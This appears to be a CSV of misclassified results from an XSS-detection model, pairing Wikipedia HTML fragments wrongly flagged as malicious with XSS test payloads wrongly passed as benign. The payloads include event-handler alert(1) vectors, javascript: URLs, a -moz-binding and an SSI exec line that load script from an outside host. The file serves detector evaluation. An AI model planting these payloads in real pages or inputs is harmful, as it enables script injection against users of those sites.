payload,true_label,predicted_label,probabilities,inference_time_ms
" </p><p>Several different forms of logic are used in AI research. <a href=""/wiki/Propositional_logic"" class=""mw-redirect"" title=""Propositional logic"">Propositional logic </a><sup id=""cite_ref-Propositional_logic_197-0"" class=""reference""><a href=""#cite_note-Propositional_logic-197"">&#91;193&#93; </a> </sup> involves <a href=""/wiki/Truth_function"" title=""Truth function"">truth functions </a> such as ""or"" and ""not"". <a href=""/wiki/First-order_logic"" title=""First-order logic"">First-order logic </a><sup id=""cite_ref-First-order_logic_198-0"" class=""reference""><a href=""#cite_note-First-order_logic-198"">&#91;194&#93; </a> </sup> adds <a href=""/wiki/Quantifier_(logic)"" title=""Quantifier (logic)"">quantifiers </a> and <a href=""/wiki/Predicate_(mathematical_logic)"" title=""Predicate (mathematical logic)"">predicates </a>, and can express facts about objects, their properties, and their relations with each other. <a href=""/wiki/Fuzzy_set_theory"" class=""mw-redirect"" title=""Fuzzy set theory"">Fuzzy set theory </a> assigns a ""degree of truth"" (between 0 and 1) to vague statements such as ""Alice is old"" (or rich, or tall, or hungry) that are too linguistically imprecise to be completely true or false. <a href=""/wiki/Fuzzy_logic"" title=""Fuzzy logic"">Fuzzy logic </a> is successfully used in <a href=""/wiki/Control_system"" title=""Control system"">control systems </a> to allow experts to contribute vague rules such as ""if you are close to the destination station and moving fast, increase the train's brake pressure""; these vague rules can then be numerically refined within the system. Fuzzy logic fails to scale well in knowledge bases; many AI researchers question the validity of chaining fuzzy-logic inferences.<sup id=""cite_ref-200"" class=""reference""><a href=""#cite_note-200"">&#91;e&#93; </a> </sup><sup id=""cite_ref-Fuzzy_logic_201-0"" class=""reference""><a href=""#cite_note-Fuzzy_logic-201"">&#91;196&#93; </a> </sup><sup id=""cite_ref-202"" class=""reference""><a href=""#cite_note-202"">&#91;197&#93; </a> </sup>",0,1,"{'benign': 0.0036, 'malicious': 0.9964}",542.5675999999982
"<tbody onkeypress=""alert(1)"" contenteditable>test</tbody>",1,0,"{'benign': 0.5281, 'malicious': 0.4719}",45.12309999999786
"<q onbeforecopy=""alert(1)"" contenteditable>test</q>",1,0,"{'benign': 0.5566, 'malicious': 0.4434}",41.940500000009706
<source onpointerdown=alert(1)>XSS</source>,1,0,"{'benign': 0.5042, 'malicious': 0.4958}",41.064399999996226
<input id=x tabindex=1 ondeactivate=alert(1)></input><input id=y autofocus>,1,0,"{'benign': 0.5367, 'malicious': 0.4633}",50.88969999999904
"<col onmousemove=""alert(1)"">test</col>",1,0,"{'benign': 0.5164, 'malicious': 0.4836}",39.790699999997514
<button id=x tabindex=1 onactivate=alert(1)></button>,1,0,"{'benign': 0.5622, 'malicious': 0.4378}",37.143400000005045
"<li><a href=""/wiki/Received_view_of_theories"" title=""Received view of theories"">Received view </a>&#160;/&#32;<a href=""/wiki/Semantic_view_of_theories"" title=""Semantic view of theories"">Semantic view of theories </a> </li>",0,1,"{'benign': 0.3034, 'malicious': 0.6966}",104.75250000000358
"<h3><span class=""mw-headline"" id=""Probabilistic_methods_for_uncertain_reasoning"">Probabilistic methods for uncertain reasoning ",0,1,"{'benign': 0.243, 'malicious': 0.757}",59.73280000000614
	 </span></a></dt><dd>Test your extraction code in an interactive environment.</dd>,0,1,"{'benign': 0.1916, 'malicious': 0.8084}",46.06470000000229
<body onload=alert(1)>,1,0,"{'benign': 0.5224, 'malicious': 0.4776}",37.85799999999995
"<image onmousedown=""alert(1)"">test</image>",1,0,"{'benign': 0.6049, 'malicious': 0.3951}",40.227799999996705
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Iphofen, Ron; Kritikos, Mihalis (3 January 2019). ""Regulating artificial intelligence and robotics: ethics by design in a digital society"". <i>Contemporary Social Science </i>: 1??5. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1080%2F21582041.2018.1563803"">10.1080/21582041.2018.1563803 </a>. <a href=""/wiki/International_Standard_Serial_Number"" title=""International Standard Serial Number"">ISSN </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//www.worldcat.org/issn/2158-2041"">2158-2041 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Contemporary+Social+Science&amp;rft.atitle=Regulating+artificial+intelligence+and+robotics%3A+ethics+by+design+in+a+digital+society&amp;rft.pages=1-15&amp;rft.date=2019-01-03&amp;rft_id=info%3Adoi%2F10.1080%2F21582041.2018.1563803&amp;rft.issn=2158-2041&amp;rft.aulast=Iphofen&amp;rft.aufirst=Ron&amp;rft.au=Kritikos%2C+Mihalis&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,1,"{'benign': 0.0616, 'malicious': 0.9384}",541.8959999999942
"<STYLE>BODY{-moz-binding:url(""http://.rocks/moz.xml#"")}</STYLE>",1,0,"{'benign': 0.576, 'malicious': 0.424}",53.274999999999295
"	 </span>. <a href=""/wiki/PubMed_Identifier"" class=""mw-redirect"" title=""PubMed Identifier"">PMID </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//pubmed.ncbi.nlm.nih.gov/16622160"">16622160 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Journal+of+the+American+Medical+Informatics+Association&amp;rft.atitle=Using+Commercial+Knowledge+Bases+for+Clinical+Decision+Support%3A+Opportunities%2C+Hurdles%2C+and+Recommendations&amp;rft.volume=13&amp;rft.issue=4&amp;rft.pages=369-371&amp;rft.date=2006-07-01&amp;rft_id=%2F%2Fwww.ncbi.nlm.nih.gov%2Fpmc%2Farticles%2FPMC1513681&amp;rft_id=info%3Apmid%2F16622160&amp;rft_id=info%3Adoi%2F10.1197%2Fjamia.M2055&amp;rft.aulast=Kuperman&amp;rft.aufirst=G.+J.&amp;rft.au=Reichley%2C+R.+M.&amp;rft.au=Bailey%2C+T.+C.&amp;rft_id=%2F%2Fwww.ncbi.nlm.nih.gov%2Fpmc%2Farticles%2FPMC1513681&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,1,"{'benign': 0.0479, 'malicious': 0.9521}",536.3001999999994
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Discover+Magazine&amp;rft.atitle=Cultivating+Common+Sense+%7C+DiscoverMagazine.com&amp;rft.date=2017&amp;rft_id=http%3A%2F%2Fdiscovermagazine.com%2F2017%2Fapril-2017%2Fcultivating-common-sense&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,1,"{'benign': 0.0047, 'malicious': 0.9953}",192.10010000000466
"<section draggable=""true"" ondragleave=""alert(1)"">test</section>",1,0,"{'benign': 0.9214, 'malicious': 0.0786}",48.32209999999293
"<blink onmousedown=""alert(1)"">test</blink>",1,0,"{'benign': 0.5179, 'malicious': 0.4821}",44.264300000008916
<details id=x tabindex=1 ondeactivate=alert(1)></details><input id=y autofocus>,1,0,"{'benign': 0.5651, 'malicious': 0.4349}",50.55069999998807
"<li><a href=""/wiki/Philosophy_of_social_science"" title=""Philosophy of social science"">Social science </a> </li>",0,1,"{'benign': 0.4958, 'malicious': 0.5042}",55.829900000006205
"Dreyfus criticized the <a href=""/wiki/Necessary_and_sufficient"" class=""mw-redirect"" title=""Necessary and sufficient"">necessary </a> condition of the <a href=""/wiki/Physical_symbol_system"" title=""Physical symbol system"">physical symbol system </a> hypothesis, which he called the ""psychological assumption"": ""The mind can be viewed as a device operating on bits of information according to formal rules."" (<a href=""#CITEREFDreyfus1992"">Dreyfus 1992 </a>, p.&#160;156) ",0,1,"{'benign': 0.3136, 'malicious': 0.6864}",131.0113000000115
<caption id=x tabindex=1 ondeactivate=alert(1)></caption><input id=y autofocus>,1,0,"{'benign': 0.6089, 'malicious': 0.3911}",55.42160000000251
"<li><a href=""/wiki/Information_theory"" title=""Information theory"">Information theory </a> </li>",0,1,"{'benign': 0.4386, 'malicious': 0.5614}",48.42239999999265
"<li id=""cite_note-AI_at_Stanford_in_the_60s-161""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-AI_at_Stanford_in_the_60s_161-0"">^ </a> </b> ",0,1,"{'benign': 0.3736, 'malicious': 0.6264}",183.75170000000196
"<col oncut=""alert(1)"" contenteditable>test</col>",1,0,"{'benign': 0.5201, 'malicious': 0.4799}",46.79979999998807
"<ul><li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;51??07 </li>",0,1,"{'benign': 0.2823, 'malicious': 0.7177}",58.34600000000023
"<li><a href=""/wiki/Evolutionary_multimodal_optimization"" title=""Evolutionary multimodal optimization"">Evolutionary multimodal optimization </a> </li>",0,1,"{'benign': 0.4539, 'malicious': 0.5461}",63.775200000009136
"<STYLE TYPE=""text/javascript"">alert('');</STYLE>",1,0,"{'benign': 0.5027, 'malicious': 0.4973}",42.508100000006266
"<li><a href=""/wiki/Control_theory"" title=""Control theory"">Control method </a> </li>",0,1,"{'benign': 0.3899, 'malicious': 0.6101}",49.46659999998815
"<output oncut=""alert(1)"" contenteditable>test</output>",1,0,"{'benign': 0.5271, 'malicious': 0.4729}",41.03449999999498
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=bookitem&amp;rft.atitle=How+to+build+complete+creatures+rather+than+isolated+cognitive+simulators&amp;rft.btitle=Architectures+for+Intelligence&amp;rft.place=Hillsdale%2C+NJ&amp;rft.pages=225-239&amp;rft.pub=Lawrence+Erlbaum+Associates&amp;rft.date=1991&amp;rft_id=%2F%2Fciteseerx.ist.psu.edu%2Fviewdoc%2Fsummary%3Fdoi%3D10.1.1.52.9510&amp;rft.aulast=Brooks&amp;rft.aufirst=R.+A.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,1,"{'benign': 0.2697, 'malicious': 0.7303}",281.3623999999919
"<li id=""cite_note-134""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-134"">^ </a> </b> ",0,1,"{'benign': 0.3412, 'malicious': 0.6588}",69.84040000000391
"<command onkeyup=""alert(1)"" contenteditable>test</command>",1,0,"{'benign': 0.5273, 'malicious': 0.4727}",45.153400000003785
"<source onmouseup=""alert(1)"">test</source>",1,0,"{'benign': 0.5797, 'malicious': 0.4203}",38.14259999998626
"	 </span> <span class=""reference-text""><cite class=""citation book"">Pennachin, C.; Goertzel, B. (2007). <i>Contemporary Approaches to Artificial General Intelligence </i>. <i>Artificial General Intelligence. Cognitive Technologies </i>. Cognitive Technologies. Berlin, Heidelberg: Springer. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1007%2F978-3-540-68677-4_1"">10.1007/978-3-540-68677-4_1 </a>. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-3-540-23733-4"" title=""Special:BookSources/978-3-540-23733-4""><bdi>978-3-540-23733-4 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Contemporary+Approaches+to+Artificial+General+Intelligence&amp;rft.place=Berlin%2C+Heidelberg&amp;rft.series=Cognitive+Technologies&amp;rft.pub=Springer&amp;rft.date=2007&amp;rft_id=info%3Adoi%2F10.1007%2F978-3-540-68677-4_1&amp;rft.isbn=978-3-540-23733-4&amp;rft.aulast=Pennachin&amp;rft.aufirst=C.&amp;rft.au=Goertzel%2C+B.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,1,"{'benign': 0.0357, 'malicious': 0.9643}",635.1949000000019
<svg onpointerenter=alert(1)>XSS</svg>,1,0,"{'benign': 0.531, 'malicious': 0.469}",41.974999999993656
"<keygen onclick=""alert(1)"">test</keygen>",1,0,"{'benign': 0.5581, 'malicious': 0.4419}",39.86310000000515
"	 </span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""https://www.economist.com/news/business/21732125-tech-giants-are-investing-billions-transformative-technology-google-leads-race"">""Google leads in the race to dominate artificial intelligence"" </a>. <i>The Economist </i>. 2017<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">12 March ",0,1,"{'benign': 0.0799, 'malicious': 0.9201}",132.75130000000956
"<map onkeydown=""alert(1)"" contenteditable>test</map>",1,0,"{'benign': 0.569, 'malicious': 0.431}",48.75240000001213
"<p>It is possible to use AI to predict or generalize the behavior of customers from their <a href=""/wiki/Digital_footprints"" class=""mw-redirect"" title=""Digital footprints"">digital footprints </a> in order to target them with personalized promotions or build customer personas automatically.<sup id=""cite_ref-Matz_et_al_2017_340-0"" class=""reference""><a href=""#cite_note-Matz_et_al_2017-340"">&#91;329&#93; </a> </sup> A documented case reports that online gambling companies were using AI to improve customer targeting.<sup id=""cite_ref-341"" class=""reference""><a href=""#cite_note-341"">&#91;330&#93; </a> </sup>",0,1,"{'benign': 0.1322, 'malicious': 0.8678}",203.19979999999305
"<img onkeypress=""alert(1)"" contenteditable>test</img>",1,0,"{'benign': 0.5475, 'malicious': 0.4525}",42.899400000010246
"<ul><li><a href=""/wiki/Behaviorism"" title=""Behaviorism"">Behaviorism </a> (<a href=""/wiki/Radical_behaviorism"" title=""Radical behaviorism"">Radical </a>) </li>",0,1,"{'benign': 0.4115, 'malicious': 0.5885}",75.74750000000563
"<STYLE type=""text/css"">BODY{background:url(""<javascript:alert>('')"")}</STYLE>",1,0,"{'benign': 0.6474, 'malicious': 0.3526}",54.644699999983004
"<output onkeypress=""alert(1)"" contenteditable>test</output>",1,0,"{'benign': 0.5254, 'malicious': 0.4746}",45.81269999999904
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;375??30, </li>",0,1,"{'benign': 0.4778, 'malicious': 0.5222}",63.39020000001483
"<li onkeyup=""alert(1)"" contenteditable>test</li>",1,0,"{'benign': 0.5274, 'malicious': 0.4726}",40.78930000000014
<keygen onpointerenter=alert(1)>XSS</keygen>,1,0,"{'benign': 0.5168, 'malicious': 0.4832}",45.14840000001641
"<li><a href=""/wiki/Multithreading_(computer_architecture)"" title=""Multithreading (computer architecture)"">Multithreading </a> </li>",0,1,"{'benign': 0.4671, 'malicious': 0.5329}",60.331700000006094
"<dt><a class=""reference internal"" href=""topics/telnetconsole.html""><span class=""doc"">Telnet Console",0,1,"{'benign': 0.3455, 'malicious': 0.6545}",50.79349999999749
"	 </span> <span class=""reference-text""><a href=""#CITEREFCNN2006""><i>CNN </i> 2006 </a>. ",0,1,"{'benign': 0.3378, 'malicious': 0.6622}",56.03000000002112
"<ul><li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, pp.&#160;214??15 </li>",0,1,"{'benign': 0.1535, 'malicious': 0.8465}",52.82479999999623
"<area onclick=""alert(1)"">test</area>",1,0,"{'benign': 0.52, 'malicious': 0.48}",42.497300000007954
"<li><a href=""/wiki/Unmanned_ground_vehicle"" title=""Unmanned ground vehicle"">ground </a> </li> </ul> </li>",0,1,"{'benign': 0.277, 'malicious': 0.723}",60.834300000010444
"<sup onmouseleave=""alert(1)"">test</sup>",1,0,"{'benign': 0.5633, 'malicious': 0.4367}",40.18099999998981
<s id=x tabindex=1 ondeactivate=alert(1)></s><input id=y autofocus>,1,0,"{'benign': 0.6385, 'malicious': 0.3615}",49.82029999999327
"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a> </li> </ul>",0,1,"{'benign': 0.4442, 'malicious': 0.5558}",52.93080000001282
	 </span>(1945) </li>,0,1,"{'benign': 0.4654, 'malicious': 0.5346}",43.640400000015234
"<li><a href=""/wiki/Ubiquitous_robot"" title=""Ubiquitous robot"">Ubiquitous </a> </li> </ul>",0,1,"{'benign': 0.3907, 'malicious': 0.6093}",54.182200000013836
"<li><cite id=""CITEREFRussellNorvig2003"" class=""citation""><a href=""/wiki/Stuart_J._Russell"" title=""Stuart J. Russell"">Russell, Stuart J. </a>; <a href=""/wiki/Peter_Norvig"" title=""Peter Norvig"">Norvig, Peter </a> (2003), <a rel=""nofollow"" class=""external text"" href=""http://aima.cs.berkeley.edu/""><i>Artificial Intelligence: A Modern Approach </i> </a> (2nd ed.), Upper Saddle River, New Jersey: Prentice Hall, <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/0-13-790395-2"" title=""Special:BookSources/0-13-790395-2""><bdi>0-13-790395-2 </bdi> </a> </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Artificial+Intelligence%3A+A+Modern+Approach&amp;rft.place=Upper+Saddle+River%2C+New+Jersey&amp;rft.edition=2nd&amp;rft.pub=Prentice+Hall&amp;rft.date=2003&amp;rft.isbn=0-13-790395-2&amp;rft.aulast=Russell&amp;rft.aufirst=Stuart+J.&amp;rft.au=Norvig%2C+Peter&amp;rft_id=http%3A%2F%2Faima.cs.berkeley.edu%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,1,"{'benign': 0.1114, 'malicious': 0.8886}",514.8599999999988
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=23"" title=""Edit section: Computational intelligence and soft computing"">edit </a><span class=""mw-editsection-bracket"">] ",0,1,"{'benign': 0.4797, 'malicious': 0.5203}",88.61459999999965
"<nobr draggable=""true"" ondragleave=""alert(1)"">test</nobr>",1,0,"{'benign': 0.7544, 'malicious': 0.2456}",48.9221999999927
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://.rocks/.js></SCRIPT>'""",1,0,"{'benign': 0.6981, 'malicious': 0.3019}",60.38449999999784
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=62"" title=""Edit section: Computationalism and functionalism"">edit </a><span class=""mw-editsection-bracket"">] ",0,1,"{'benign': 0.4251, 'malicious': 0.5749}",77.21540000000005
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Fast+Company&amp;rft.atitle=Elon+Musk+Is+Donating+%2410M+Of+His+Own+Money+To+Artificial+Intelligence+Research&amp;rft.date=2015-01-15&amp;rft_id=http%3A%2F%2Fwww.fastcompany.com%2F3041007%2Ffast-feed%2Felon-musk-is-donating-10m-of-his-own-money-to-artificial-intelligence-research&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,1,"{'benign': 0.0031, 'malicious': 0.9969}",238.9474000000007
"<meta onmousedown=""alert(1)"">test</meta>",1,0,"{'benign': 0.5488, 'malicious': 0.4512}",41.38679999999795
"<li><a href=""/wiki/Robot_Hall_of_Fame"" title=""Robot Hall of Fame"">Hall of Fame </a> </li>",0,1,"{'benign': 0.4764, 'malicious': 0.5236}",56.6793000000132
"<li><a href=""/wiki/Underdetermination"" title=""Underdetermination"">Underdetermination </a> </li>",0,1,"{'benign': 0.4891, 'malicious': 0.5109}",44.555599999995366
"	 </span>. <i>Journal of Informetrics </i>. <b>5 </b> (4): 629??49. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2Fj.joi.2011.06.002"">10.1016/j.joi.2011.06.002 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Journal+of+Informetrics&amp;rft.atitle=Comparing+the+expert+survey+and+citation+impact+journal+ranking+methods%3A+Example+from+the+field+of+Artificial+Intelligence&amp;rft.volume=5&amp;rft.issue=4&amp;rft.pages=629-649&amp;rft.date=2011&amp;rft_id=info%3Adoi%2F10.1016%2Fj.joi.2011.06.002&amp;rft.aulast=Serenko&amp;rft.aufirst=Alexander&amp;rft.au=Michael+Dohan&amp;rft_id=http%3A%2F%2Fwww.aserenko.com%2Fpapers%2FJOI_AI_Journal_Ranking_Serenko.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,1,"{'benign': 0.0271, 'malicious': 0.9729}",444.99909999998977
"	 </span>. <i>Proceedings of the SPIE AeroSense Session on Unmanned Ground Vehicle Technology </i>. Unmanned Ground Vehicle Technology IV. <b>3693 </b>. pp.&#160;11??0. <a href=""/wiki/Bibcode"" title=""Bibcode"">Bibcode </a>:<a rel=""nofollow"" class=""external text"" href=""https://ui.adsabs.harvard.edu/abs/2002SPIE.4715..303A"">2002SPIE.4715..303A </a>. <a href=""/wiki/CiteSeerX"" title=""CiteSeerX"">CiteSeerX </a>&#160;<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.15.14"">10.1.1.15.14 </a> ",0,1,"{'benign': 0.3856, 'malicious': 0.6144}",239.41370000000006
"<s onbeforecopy=""alert(1)"" contenteditable>test</s>",1,0,"{'benign': 0.5523, 'malicious': 0.4477}",43.13730000001215
"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;18??1 </li> </ul>",0,1,"{'benign': 0.3745, 'malicious': 0.6255}",63.73709999999733
"<li><a href=""/wiki/Claytronics"" title=""Claytronics"">Claytronics </a> </li>",0,1,"{'benign': 0.4598, 'malicious': 0.5402}",53.81429999999909
"        <nav data-toggle=""wy-nav-shift"" class=""wy-nav-side"">",0,1,"{'benign': 0.3343, 'malicious': 0.6657}",47.057100000017726
"<li><a href=""/wiki/Materialism"" title=""Materialism"">Materialism </a> </li>",0,1,"{'benign': 0.4642, 'malicious': 0.5358}",47.00560000000564
"<img onmousedown=""alert(1)"">test</img>",1,0,"{'benign': 0.5474, 'malicious': 0.4526}",42.37459999998805
"	 </span> </a> </i>&#93; </sup>, including <a href=""/wiki/Computer_vision"" title=""Computer vision"">computer vision </a>, <a href=""/wiki/Speech_recognition"" title=""Speech recognition"">speech recognition </a>, <a href=""/wiki/Natural_language_processing"" title=""Natural language processing"">natural language processing </a> and others.<sup id=""cite_ref-goodfellow2016_247-0"" class=""reference""><a href=""#cite_note-goodfellow2016-247"">&#91;236&#93; </a> </sup><sup id=""cite_ref-HintonDengYu2012_248-0"" class=""reference""><a href=""#cite_note-HintonDengYu2012-248"">&#91;237&#93; </a> </sup><sup id=""cite_ref-schmidhuber2015_246-1"" class=""reference""><a href=""#cite_note-schmidhuber2015-246"">&#91;235&#93; </a> </sup>",0,1,"{'benign': 0.4876, 'malicious': 0.5124}",255.79849999999738
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=www-formal.stanford.edu&amp;rft.atitle=Applications+of+AI&amp;rft_id=http%3A%2F%2Fwww-formal.stanford.edu%2Fjmc%2Fwhatisai%2Fnode3.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,1,"{'benign': 0.0243, 'malicious': 0.9757}",187.36050000001114
<main id=x tabindex=1 onactivate=alert(1)></main>,1,0,"{'benign': 0.5249, 'malicious': 0.4751}",43.718699999999444
"<h3><span class=""mw-headline"" id=""Law-related_professions"">Law-related professions ",0,1,"{'benign': 0.245, 'malicious': 0.755}",52.893599999976004
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=61"" title=""Edit section: Consciousness"">edit </a><span class=""mw-editsection-bracket"">] ",0,1,"{'benign': 0.409, 'malicious': 0.591}",75.55759999999623
"<li><a href=""/wiki/Alexey_Lyapunov"" title=""Alexey Lyapunov"">Alexey Lyapunov </a> </li>",0,1,"{'benign': 0.4086, 'malicious': 0.5914}",58.02739999998607
"<BODY BACKGROUND=""javascript:alert('')"">",1,0,"{'benign': 0.6985, 'malicious': 0.3015}",40.04169999998908
"<p onmouseout=""alert(1)"">test</p>",1,0,"{'benign': 0.5119, 'malicious': 0.4881}",41.66609999998627
"<option onclick=""alert(1)"">test</option>",1,0,"{'benign': 0.5357, 'malicious': 0.4643}",37.28490000000306
<q id=x tabindex=1 onbeforedeactivate=alert(1)></q><input autofocus>,1,0,"{'benign': 0.5308, 'malicious': 0.4692}",58.85000000000673
<base id=x tabindex=1 onactivate=alert(1)></base>,1,0,"{'benign': 0.5378, 'malicious': 0.4622}",44.6039000000269
"	 </span>. Harvard University Press. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-674-57616-2"" title=""Special:BookSources/978-0-674-57616-2""><bdi>978-0-674-57616-2 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Mind+Children&amp;rft.pub=Harvard+University+Press&amp;rft.date=1988&amp;rft.isbn=978-0-674-57616-2&amp;rft.aulast=Moravec&amp;rft.aufirst=Hans&amp;rft_id=https%3A%2F%2Farchive.org%2Fdetails%2Fmindchildrenfutu00mora&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,1,"{'benign': 0.2266, 'malicious': 0.7734}",313.69669999997996
<blink id=x tabindex=1 ondeactivate=alert(1)></blink><input id=y autofocus>,1,0,"{'benign': 0.5034, 'malicious': 0.4966}",49.656099999992875
"<li><a href=""/wiki/Imre_Lakatos"" title=""Imre Lakatos"">Imre Lakatos </a> </li>",0,1,"{'benign': 0.0852, 'malicious': 0.9148}",58.434500000004164
</script><script>alert('');</script>,1,0,"{'benign': 0.5574, 'malicious': 0.4426}",40.14459999999076
<rp onblur=alert(1) tabindex=1 id=x></rp><input autofocus>,1,0,"{'benign': 0.5713, 'malicious': 0.4287}",49.12300000000869
"<li><a href=""/wiki/Wilhelm_Wundt"" title=""Wilhelm Wundt"">Wilhelm Wundt </a> </li>",0,1,"{'benign': 0.4081, 'malicious': 0.5919}",52.62479999998959
"<main oncopy=""alert(1)"" contenteditable>test</main>",1,0,"{'benign': 0.522, 'malicious': 0.478}",41.90159999998855
"<base oncut=""alert(1)"" contenteditable>test</base>",1,0,"{'benign': 0.5283, 'malicious': 0.4717}",44.6113000000139
<main id=x tabindex=1 ondeactivate=alert(1)></main><input id=y autofocus>,1,0,"{'benign': 0.5818, 'malicious': 0.4182}",46.44550000000436
"<li><a href=""/wiki/Electric_unicycle"" title=""Electric unicycle"">Electric unicycle </a> </li>",0,1,"{'benign': 0.2041, 'malicious': 0.7959}",49.306000000001404
"<caption onmousemove=""alert(1)"">test</caption>",1,0,"{'benign': 0.5065, 'malicious': 0.4935}",43.275700000009465
